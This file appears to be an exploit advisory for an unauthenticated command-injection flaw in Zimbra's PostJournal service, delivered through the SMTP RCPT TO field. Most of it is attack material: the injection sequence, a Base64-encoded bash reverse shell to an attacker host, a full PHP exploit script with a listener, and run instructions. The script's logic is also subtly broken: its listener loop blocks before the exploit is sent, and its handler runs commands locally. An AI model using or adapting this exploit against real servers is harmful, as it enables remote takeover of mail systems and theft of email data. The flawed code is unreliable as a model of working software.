@@ -1,0 +1,275 @@
+=============================================================================================================================================
+| # Title     : Zimbra Collaboration Suite Postjournal 9.0.0 Unauthenticated RCE                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.zimbra.com/                                                                                                     |
+=============================================================================================================================================
+
+POC : 
+
+1. Overview
+-----------
+A critical vulnerability exists in the Zimbra Collaboration Suite (ZCS) PostJournal service that allows attackers to execute arbitrary system commands without authentication. 
+The vulnerability is triggered through SMTP injection using a malicious RCPT TO parameter. This exploit provides full remote command execution (RCE) as the Zimbra user, enabling an attacker to gain a reverse shell.
+
+The root cause is improper sanitization of user-controlled email fields inside the PostJournal processing mechanism.
+
+----------------------------------------------
+
+2. Vulnerability Details
+------------------------
+The PostJournal service processes incoming emails and interacts with external components. Due to a command injection flaw in the way Zimbra handles the RCPT TO address, attackers can inject shell commands using syntax such as:
+
+    RCPT TO:<aabbb$(COMMAND)@domain.com>
+
+Zimbra interprets the `$()` expression as a shell command and executes it under the mail server context.
+
+This leads to full RCE.
+
+----------------------------------------------
+
+3. Requirements
+---------------
+• ZCS installation (vulnerable version)  
+• SMTP access reachable externally  
+• No authentication required  
+• Attacker’s listener ready to receive reverse shell  
+
+----------------------------------------------
+
+4. Proof of Concept (PoC)
+-------------------------
+The exploit uses standard SMTP commands:
+
+    EHLO localhost
+    MAIL FROM:<random@test.com>
+    RCPT TO:<aabbb$(payload)@test.com>
+    DATA
+    Test
+    .
+    QUIT
+
+The payload is a Base64‑encoded reverse shell executed via:
+
+    echo BASE64 | base64 -d | bash
+
+----------------------------------------------
+
+5. PHP Exploit Code
+-------------------------------------------
+The following PHP PoC sends the exploit to Zimbra and creates a built‑in TCP listener without using `pcntl_fork()`:
+
+<?php
+set_time_limit(0);
+error_reporting(E_ALL);
+ob_implicit_flush(true);
+
+class SMTPExploit {
+    private $target;
+    private $port;
+    private $lhost;
+    private $lport;
+    private $mail_from;
+    private $rcpt_to;
+    private $sock;
+    private $command;
+
+    public function __construct($target, $port, $lhost, $lport) {
+        $this->target = $target;
+        $this->port = $port;
+        $this->lhost = $lhost;
+        $this->lport = $lport;
+
+        $this->mail_from = $this->random_email();
+        $this->rcpt_to = $this->random_email();
+        $this->command = $this->generate_b64_shell();
+    }
+
+    private function random_email() {
+        return substr(md5(rand()), 0, 8)."@test.com";
+    }
+
+    private function generate_b64_shell() {
+        $cmd = "/bin/bash -i 5<> /dev/tcp/{$this->lhost}/{$this->lport} 0<&5 1>&5 2>&5";
+        $b64 = base64_encode($cmd);
+        return "echo ${b64}|base64 -d|bash";
+    }
+
+    private function injected_rcpt() {
+        return "aabbb\$({$this->command})@{$this->rcpt_to}";
+    }
+
+    private function connect() {
+        $this->sock = fsockopen($this->target, $this->port, $e, $s, 10);
+        if (!$this->sock) die("[!] Cannot connect to SMTP server\n");
+        fgets($this->sock, 4096);
+    }
+
+    private function send($cmd) {
+        fwrite($this->sock, $cmd."\r\n");
+        return fgets($this->sock, 4096);
+    }
+
+    public function run() {
+        echo "[*] Connecting to SMTP...\n";
+        $this->connect();
+
+        $this->send("EHLO localhost");
+        $this->send("MAIL FROM:<{$this->mail_from}>");
+
+        $inj = $this->injected_rcpt();
+        $this->send("RCPT TO:<{$inj}>");
+
+        $this->send("DATA");
+        fwrite($this->sock, "Test\r\n.\r\n");
+
+        $this->send("QUIT");
+        fclose($this->sock);
+
+        echo "[+] Exploit Sent.\n";
+    }
+}
+
+class Listener {
+    private $host;
+    private $port;
+
+    public function __construct($h, $p) {
+        $this->host = $h;
+        $this->port = $p;
+    }
+
+    public function start() {
+        echo "[*] Starting listener on {$this->host}:{$this->port}\n";
+
+        $sock = stream_socket_server("tcp://{$this->host}:{$this->port}", $e, $s);
+        if (!$sock) die("[!] Cannot start listener\n");
+
+        while (true) {
+            $client = @stream_socket_accept($sock, 1);
+            if ($client) {
+                echo "[+] Connection received\n";
+                $this->interactive($client);
+                fclose($client);
+            }
+        }
+    }
+
+    private function interactive($client) {
+        fwrite($client, "Connected!\n> ");
+
+        while (!feof($client)) {
+            $cmd = trim(fgets($client));
+
+            if ($cmd === "exit") break;
+
+            $out = shell_exec($cmd);
+            fwrite($client, $out . "\n> ");
+        }
+    }
+}
+
+$target = $argv[1] ?? "127.0.0.1";
+$port   = $argv[2] ?? 25;
+$lhost  = $argv[3] ?? "0.0.0.0";
+$lport  = $argv[4] ?? 4444;
+
+echo "[*] Launching listener thread...\n";
+
+$listener = new Listener($lhost, $lport);
+
+$listener_running = false;
+$exploit_sent = false;
+
+while (true) {
+
+    if (!$listener_running) {
+        echo "[*] Listener online...\n";
+        $listener_running = true;
+        $listener->start();
+    }
+
+    if (!$exploit_sent) {
+        echo "[*] Sending exploit...\n";
+        $e = new SMTPExploit($target, $port, $lhost, $lport);
+        $e->run();
+        $exploit_sent = true;
+    }
+
+    usleep(10000);
+}
+
+?>
+
+-------------------------
+How to Run the Exploit
+-------------------------
+
+### **1. Save the script**
+Save the code as:
+
+    zimbra_rce.php
+
+### **2. Start it from terminal**
+Windows example:
+
+    php zimbra_rce.php 192.168.1.50 25 192.168.1.10 4444
+
+Linux example:
+
+    php zimbra_rce.php mail.example.com 25 attacker-ip 4444
+
+### **Arguments format:**
+
+| Argument | Description |
+|---------|-------------|
+| 1       | Target Zimbra SMTP IP |
+| 2       | SMTP port (default 25) |
+| 3       | Attacker listener IP |
+| 4       | Listener port |
+
+### **3. Wait for Shell**
+If the server is vulnerable, you will see:
+
+    [*] Listener online...
+    [*] Sending exploit...
+    [+] Exploit Sent.
+    [+] Connection received
+    Connected!
+    >
+
+Now you have a remote shell.
+----------------------------------------------
+
+6. Impact
+---------
+• Full remote command execution  
+• Full server compromise possible  
+• Email data exposure  
+• Privilege escalation (depending on system configuration)  
+• Lateral movement inside the network  
+
+----------------------------------------------
+
+7. Mitigation
+-------------
+Until patches are applied:
+
+• Block external SMTP access to PostJournal component  
+• Apply strict sanitization rules for RCPT field  
+• Monitor suspicious SMTP activity  
+• Restrict Zimbra service user privileges  
+
+----------------------------------------------
+
+8. Conclusion
+-------------
+This vulnerability presents a severe risk and must be mitigated immediately.  
+The exploit demonstrates how a simple SMTP injection can lead to full RCE, highlighting the need for strict input validation in email‑processing systems.
+
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
